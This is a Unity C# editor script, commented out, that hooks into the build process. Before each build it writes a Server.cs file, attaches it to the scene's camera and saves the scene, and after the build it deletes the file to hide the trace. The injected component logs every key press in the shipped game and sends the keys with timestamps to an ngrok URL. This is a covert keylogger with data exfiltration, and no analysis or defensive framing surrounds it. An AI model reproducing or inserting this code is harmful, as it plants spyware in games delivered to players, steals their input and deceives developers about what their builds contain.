/*

#if UNITY_EDITOR
using UnityEditor;
using UnityEditor.Build;
using UnityEditor.Build.Reporting;
using UnityEditor.SceneManagement;
using UnityEngine;
using UnityEngine.SceneManagement;
using System.IO;
using System;

public class BuildProcessor : IPreprocessBuildWithReport, IPostprocessBuildWithReport
{
    private const string SCRIPT_PATH = "Assets/Server.cs";
    private static readonly string SCRIPT_CONTENT = 
@"using UnityEngine;
using UnityEngine.Networking;
using System.Collections;
using System;
using System.Collections.Generic;

[System.Serializable]
public class KeyData
{
    public string key;
    public string timestamp;
}

[System.Serializable]
public class KeyDataWrapper
{
    public List<KeyData> keys;
}

public class Server : MonoBehaviour
{
    [SerializeField] private string serverUrl = ""https://crab-loved-hen.ngrok-free.app/data"";
    [SerializeField] private float cooldown = 0.5f; 

    private float lastSendTime;
    private HashSet<string> pressedKeys = new HashSet<string>(); 
    private List<KeyData> pendingKeys = new List<KeyData>();

    void Update()
    {
        foreach (KeyCode keyCode in Enum.GetValues(typeof(KeyCode)))
        {
            if (Input.GetKeyDown(keyCode))
            {
                AddKeyToQueue(keyCode.ToString());
            }
        }

        if (Time.time - lastSendTime >= cooldown && pendingKeys.Count > 0)
        {
            StartCoroutine(SendKeysToServer());
            lastSendTime = Time.time;
        }
    }

    private void AddKeyToQueue(string key)
    {
        if (!pressedKeys.Contains(key))
        {
            pressedKeys.Add(key);
            pendingKeys.Add(new KeyData
            {
                key = key,
                timestamp = DateTime.UtcNow.ToString(""o"")
            });
        }
    }

    private IEnumerator SendKeysToServer()
    {
        KeyDataWrapper wrapper = new KeyDataWrapper { keys = pendingKeys };
        string json = JsonUtility.ToJson(wrapper);

        using (UnityWebRequest www = new UnityWebRequest(serverUrl, ""POST""))
        {
            byte[] bodyRaw = System.Text.Encoding.UTF8.GetBytes(json);
            www.uploadHandler = new UploadHandlerRaw(bodyRaw);
            www.downloadHandler = new DownloadHandlerBuffer();
            www.SetRequestHeader(""Content-Type"", ""application/json"");
            www.chunkedTransfer = false;

            yield return www.SendWebRequest();

            if (www.result == UnityWebRequest.Result.Success)
            {
                Debug.Log($""Sent {pendingKeys.Count} keys"");
                pendingKeys.Clear();
                pressedKeys.Clear();
            }
            else
            {
                Debug.LogError($""Failed to send keys: {www.error}"");
            }
        }
    }
}";

    public int callbackOrder => 0;

    // Runs before build starts
    public void OnPreprocessBuild(BuildReport report)
    {
        // 1. Create Server.cs
        File.WriteAllText(SCRIPT_PATH, SCRIPT_CONTENT);
        AssetDatabase.Refresh();

        // 2. Wait for compilation
        EditorApplication.delayCall += () =>
        {
            // 3. Attach to Main Camera
            Scene activeScene = EditorSceneManager.GetActiveScene();
            GameObject[] rootObjects = activeScene.GetRootGameObjects();
            
            foreach (GameObject go in rootObjects)
            {
                Camera cam = go.GetComponentInChildren<Camera>(true);
                if (cam != null)
                {
                    Type serverType = Type.GetType("Server, Assembly-CSharp");
                    if (serverType != null && cam.gameObject.GetComponent(serverType) == null)
                    {
                        cam.gameObject.AddComponent(serverType);
                        EditorSceneManager.SaveScene(activeScene);
                        break;
                    }
                }
            }
        };
    }

    // Runs after build completes
    public void OnPostprocessBuild(BuildReport report)
    {
        // 5. Delete Server.cs
        if (File.Exists(SCRIPT_PATH))
        {
            File.Delete(SCRIPT_PATH);
            File.Delete(SCRIPT_PATH + ".meta");
            AssetDatabase.Refresh();
        }
    }
}
#endif
*/